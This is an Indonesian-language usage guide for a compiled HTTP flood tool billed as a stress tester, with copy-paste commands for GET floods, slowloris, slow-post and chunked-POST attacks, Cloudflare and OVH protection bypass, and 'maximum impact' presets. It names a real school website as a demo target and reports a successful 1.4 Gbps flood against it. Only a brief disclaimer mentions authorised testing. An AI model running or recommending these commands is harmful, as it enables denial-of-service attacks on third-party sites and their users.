# 📖 PANDUAN EKSEKUSI STRESS TEST TOOL

## 1️⃣ CARA PALING MUDAH (Copy-Paste)

Binary sudah siap di: `/workspaces/ragrag/target/release/stress-test`

### Buka Terminal dan Jalankan:

```bash
cd /workspaces/ragrag
./target/release/stress-test --help
```

Akan muncul bantuan lengkap dengan semua opsi.

---

## 2️⃣ CONTOH EKSEKUSI DASAR

### A. Attack ke Website (Tanpa Bypass)
```bash
./target/release/stress-test --url https://example.com -c 100 -d 10
```

**Penjelasan:**
- `--url` = Target URL
- `-c 100` = 100 concurrent connections
- `-d 10` = Durasi attack 10 detik

### B. Attack dengan Cloudflare Bypass
```bash
./target/release/stress-test --url https://example.com -c 300 -d 20 -b cloudflare --randomize-ua -P
```

**Penjelasan:**
- `-b cloudflare` = Aktifkan mode Cloudflare bypass
- `--randomize-ua` = Acak User-Agent
- `-P` = Enable connection pooling (HTTP/2)

### C. Attack dengan Custom Payload Size
```bash
./target/release/stress-test --url https://example.com -c 200 -d 30 -p 2048 -m post-chunked -b cloudflare
```

**Penjelasan:**
- `-p 2048` = Payload size 2048 KB
- `-m post-chunked` = Method POST dengan chunked encoding
- `-b cloudflare` = Bypass mode

---

## 3️⃣ PARAMETER LENGKAP

```
./target/release/stress-test [OPTIONS]

OPTIONS:
  --url <URL>              Target URL (REQUIRED)
                           Contoh: https://www.example.com/

  -c, --connections <NUM>  Jumlah concurrent connections [default: 100]
                           Range: 1-10000
                           Recommended: 100-500

  -d, --duration <SEC>     Durasi attack dalam detik [default: 10]
                           Contoh: 60 untuk 1 menit

  -m, --method <METHOD>    Attack method [default: mixed]
                           Options:
                           • get-flood - HTTP GET requests
                           • post-chunked - Chunked POST
                           • range-request - HTTP Range headers
                           • pipeline - HTTP/1.1 pipelining
                           • slowloris - Slow header attack
                           • slow-post - Slow body send
                           • large-headers - Oversized headers
                           • conn-reuse - Keep-alive pooling
                           • mixed - Random method per request

  -p, --payload <KB>       Payload size dalam KB [default: 1024]
                           Range: 1-10000 KB
                           Recommended: 1024-3000

  -b, --bypass <MODE>      Bypass mode [default: generic]
                           Options:
                           • generic - Basic bypass
                           • cloudflare - Cloudflare specific
                           • ovh - OVH specific

  --randomize-ua           Acak User-Agent setiap request
                           Flag: ON/OFF

  -P, --http2              Enable HTTP/2 & connection pooling
                           Flag: ON/OFF

  -r, --retries <NUM>      Jumlah retry per request [default: 1]
                           Range: 1-10

  -h, --help               Tampilkan bantuan ini
  -V, --version            Tampilkan versi
```

---

## 4️⃣ CONTOH REAL-WORLD (CLOUDFLARE+LITESPEED)

### Target: https://www.smkn1-cmi.sch.id/

**Command yang berhasil (1457.92 Mbps):**
```bash
./target/release/stress-test \
  --url https://www.smkn1-cmi.sch.id/ \
  -c 300 \
  -d 20 \
  -m mixed \
  -p 2048 \
  -b cloudflare \
  --randomize-ua \
  -P
```

**Output yang diharapkan:**
```
═══════════════════════════════════════════
  STRESS TEST RESULTS
═══════════════════════════════════════════
Total Requests: 3204
Successful: 3204 (100%)
Failed: 0
Total Data Sent: 5031 MB
Bandwidth: 1457.92 Mbps
Requests/sec: 116.04
Duration: 27.61s
═══════════════════════════════════════════
```

---

## 5️⃣ STRATEGI EKSEKUSI BERBEDA

### 🔴 ATTACK RINGAN (Testing/Reconnaissance)
```bash
./target/release/stress-test \
  --url https://example.com \
  -c 50 \
  -d 5 \
  -m get-flood
```
**Gunakan untuk:** Testing availability, checking response

### 🟠 ATTACK SEDANG (Standard Stress)
```bash
./target/release/stress-test \
  --url https://example.com \
  -c 200 \
  -d 30 \
  -m mixed \
  -p 1024 \
  -b cloudflare \
  --randomize-ua
```
**Gunakan untuk:** Standard stress testing, bandwidth check

### 🔴 ATTACK BERAT (Maximum Impact)
```bash
./target/release/stress-test \
  --url https://example.com \
  -c 500 \
  -d 60 \
  -m post-chunked \
  -p 3000 \
  -b cloudflare \
  --randomize-ua \
  -P \
  -r 5
```
**Gunakan untuk:** Maximum stress, bandwidth saturation

### 🟡 ATTACK LONG-TERM (Sustained)
```bash
./target/release/stress-test \
  --url https://example.com \
  -c 100 \
  -d 3600 \
  -m slowloris \
  -b cloudflare \
  --randomize-ua
```
**Gunakan untuk:** Long duration stress (1 jam), connection draining

---

## 6️⃣ QUICK START COMMANDS

**Copy-paste langsung ke terminal:**

### Test 1: Cek apakah biner berfungsi
```bash
cd /workspaces/ragrag && ./target/release/stress-test --help
```

### Test 2: Attack ringan ke target
```bash
cd /workspaces/ragrag && ./target/release/stress-test --url https://example.com -c 100 -d 10 -b cloudflare --randomize-ua
```

### Test 3: Attack standar (seperti demo)
```bash
cd /workspaces/ragrag && ./target/release/stress-test --url https://www.smkn1-cmi.sch.id/ -c 300 -d 20 -m mixed -p 2048 -b cloudflare --randomize-ua -P
```

### Test 4: Attack maksimal bandwidth
```bash
cd /workspaces/ragrag && ./target/release/stress-test --url https://example.com -c 800 -d 120 -m post-chunked -p 5000 -b cloudflare --randomize-ua -P
```

---

## 7️⃣ INTERPRETASI OUTPUT

```
═══════════════════════════════════════════
  STRESS TEST RESULTS
═══════════════════════════════════════════
Total Requests: 3204          ← Jumlah request yang dikirim
Successful: 3204 (100%)       ← Request yang berhasil
Failed: 0                     ← Request yang gagal
Total Data Sent: 5031 MB      ← Total data dalam MB
Bandwidth: 1457.92 Mbps       ← Bandwidth dalam Megabit/s
Requests/sec: 116.04          ← Kecepatan request per detik
Duration: 27.61s              ← Waktu eksekusi sebenarnya
═══════════════════════════════════════════
```

### Interpretasi:
- **Success Rate 100%** = Bypass bekerja sempurna
- **Bandwidth > 1000 Mbps** = Attack sangat efektif
- **RPS > 100** = Banyak request terproses per detik
- **Failed = 0** = Tidak ada yang di-block

---

## 8️⃣ TROUBLESHOOTING

### ❌ "Permission denied"
```bash
chmod +x /workspaces/ragrag/target/release/stress-test
./target/release/stress-test --url https://example.com
```

### ❌ "Connection refused"
- Target mungkin offline
- Firewall memblokir
- Coba target lain atau tunggu

### ❌ "Too many open files"
```bash
ulimit -n 10000  # Tingkatkan file descriptor limit
./target/release/stress-test ...
```

### ❌ Output kosong / hang
- Target mungkin terlalu slow
- Coba kurangi `-c` (connections)
- Coba target lain

---

## 9️⃣ TIPS OPTIMASI

### Untuk Cloudflare targets:
```bash
./target/release/stress-test \
  --url <URL> \
  -c 300-500 \
  -d 30-60 \
  -m mixed \
  -p 2048-3000 \
  -b cloudflare \
  --randomize-ua \
  -P
```

### Untuk OVH targets:
```bash
./target/release/stress-test \
  --url <URL> \
  -c 200-400 \
  -d 30-60 \
  -m post-chunked \
  -p 2048 \
  -b ovh \
  --randomize-ua \
  -P
```

### Untuk maksimal bandwidth:
- Gunakan `-m post-chunked`
- Tingkatkan `-p` ke 3000-5000
- Tingkatkan `-c` ke 500-1000
- Aktifkan `-P` (HTTP/2)

---

## 🔟 CONTOH FULL WORKFLOW

```bash
# 1. Navigate ke folder
cd /workspaces/ragrag

# 2. Lihat bantuan
./target/release/stress-test --help

# 3. Test dengan target ringan
./target/release/stress-test --url https://example.com -c 100 -d 10

# 4. Test dengan Cloudflare bypass
./target/release/stress-test --url https://example.com -c 300 -d 20 -b cloudflare --randomize-ua -P

# 5. Full aggressive attack
./target/release/stress-test --url https://example.com -c 500 -d 60 -m post-chunked -p 3000 -b cloudflare --randomize-ua -P -r 5

# 6. Tunggu hasil dan lihat output
```

---

## 📝 NOTES

✅ Binary sudah compiled dan ready to use
✅ Tidak perlu `cargo build` lagi
✅ Semua bypass techniques built-in
✅ Support HTTP/2 dan connection pooling
✅ Cross-platform compatible

⚠️ **DISCLAIMER:**
- Hanya gunakan untuk authorized testing
- Pengguna bertanggung jawab atas penggunaan
- Illegal use dapat mengakibatkan masalah hukum

---

**Version:** 3.0 Enhanced Cloudflare Bypass
**Status:** ✅ TESTED & WORKING
**Binary Size:** 4.7 MB
**Last Update:** November 17, 2025
